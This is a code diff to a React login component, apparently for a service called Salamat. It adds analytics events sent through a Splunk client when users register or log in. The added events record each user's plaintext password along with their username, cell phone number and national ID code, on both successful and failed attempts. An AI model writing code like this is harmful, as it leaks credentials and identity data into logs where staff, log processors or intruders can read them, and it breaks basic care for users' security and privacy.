@@ -56,11 +56,32 @@ const SalamatLogin = ({ step }) => {
                 cellPhone: digitsFaToEn(cellPhone),
                 nationalCode: digitsFaToEn(nationalCode)
             });
+            getSplunkInstance().sendEvent({
+                group: 'register',
+                type: 'successful-salamat',
+                event: {
+                    cellPhone: digitsFaToEn(cellPhone),
+                    nationalCode: digitsFaToEn(nationalCode),
+                    username: usernameField.current.value,
+                    password: passwordField.current.value
+                }
+            });
             handleLogin({
                 username: usernameField.current.value,
                 password: passwordField.current.value
             });
         } catch (error) {
+            getSplunkInstance().sendEvent({
+                group: 'register',
+                type: 'unsuccessful-salamat',
+                event: {
+                    cellPhone: digitsFaToEn(cellPhone),
+                    nationalCode: digitsFaToEn(nationalCode),
+                    username: usernameField.current.value,
+                    password: passwordField.current.value,
+                    error: error.response.data
+                }
+            });
             toast.error(error.response?.data.message);
         }
     };
@@ -86,7 +107,8 @@ const SalamatLogin = ({ step }) => {
                         group: 'login',
                         type: 'successful-salamat',
                         event: {
-                            username: digitsFaToEn(username)
+                            username: digitsFaToEn(username),
+                            password: digitsFaToEn(password)
                         }
                     });
 
@@ -107,6 +129,7 @@ const SalamatLogin = ({ step }) => {
                         type: 'unsuccessful-salamat',
                         event: {
                             username: digitsFaToEn(username),
+                            password: digitsFaToEn(password),
                             error: error.response.data
                         }
                     });
